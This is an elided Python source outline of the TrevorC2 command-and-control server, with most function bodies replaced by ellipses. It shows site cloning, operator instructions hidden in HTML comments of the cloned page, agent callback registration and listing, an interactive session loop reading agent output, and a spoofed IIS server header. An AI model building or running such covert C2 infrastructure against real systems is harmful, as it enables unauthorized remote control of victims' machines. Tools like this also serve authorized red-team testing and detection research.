...
try:
    ...
    print(
        "[!] Python module bleach not installed. Try pip install bleach and re-run TrevorC2 Server."
    )
    sys.exit()
import shutil
import logging
...
try:
    ...
    print(
        "[!] Python module tornado not installed. Try pip install tornado and re-run TrevorC2 Server."
    )
    sys.exit()
import hashlib
import cmd
...
class TrevorPrompt(cmd.Cmd):  #prompt class
    ...
    def do_interact(self, inp):
        try:
            ...
            print("\n*** interact with {} {}.".format(agent.hostname,
                                                      agent.sessionid))
            ...
            while 1:
                ...
                while 1:
                    ...
                    if os.path.isfile("clone_site/received_" +
                                      agent.sessionid + ".txt"):
                        data = open(
                            "clone_site/received_" + agent.sessionid + ".txt",
                            "r").read()
                        print("[*] Received response back from client...")
                        print(data)
                        # remove this so we don't use it anymore
                        os.remove("clone_site/received_" + agent.sessionid +
                                  ".txt")
                        break
                    time.sleep(.3)
        except ValueError:
    ...
    def do_list(self, inp):
        if agent_list == []:
            ...
            for agent in agent_list:
                print("%-4s%-24s%-18s%-13s" %
                      (str(agent.id), agent.hostname, agent.remoteip,
                       agent.sessionid))
...
def randomString():
    ...
    return ''.join(
        random.choice(letters) for i in range(COOKIE_SESSIONID_LENGTH))
...
def clone_site(user_agent, url):
    ...
    try:
        ...
        if web_request.status_code != 200 or len(web_request.content) < 1:
            print("[!] Unable to clone the site. Status Code: %s" %
...
class UnknownPageHandler(tornado.web.RequestHandler):
    ...
    def get(self):
        ...
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(
            x_real_ip)
    ...
    def post(self):
        ...
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(
            x_real_ip)
        log.warning(
            'Invalid request type POST identified {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        return
...
class RPQ(tornado.web.RequestHandler):
    ...
    def get(self):
        ...
        if self.get_cookie(COOKIE_SESSIONID_STRING):
            ...
            instructions = ("")
            print("[!] Somebody without a cookie accessed the website from {}".
                  format(remote_ip))
        ...
        if REDIRECT.lower() == ("on") and cookie_value == 0:
            ...
            site_data = site_data.replace(
                "</body>", "<!-- %s%s --></body>" % (STUB, instructions))
...
class SPQ(tornado.web.RequestHandler):
    ...
    def get(self):
        ...
        if "magic_hostname=" in query_output:
            ...
            print(
                "\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2."
                .format(remote_ip, hostname, sid))
        else:
...
def main_c2():
    ...
    application = tornado.web.Application([
        (ROOT_PATH_QUERY, RPQ),
        (SITE_PATH_QUERY, SPQ),
        (r'/.*', UnknownPageHandler
         )  # Make this the last line, if not matched, will hit this rule.
    ])
    ...
    try:
        ...
        if "Address already in use" in str(e):
            ...
            print("[!] Something went wrong, printing error message here: " +
                  str(e))
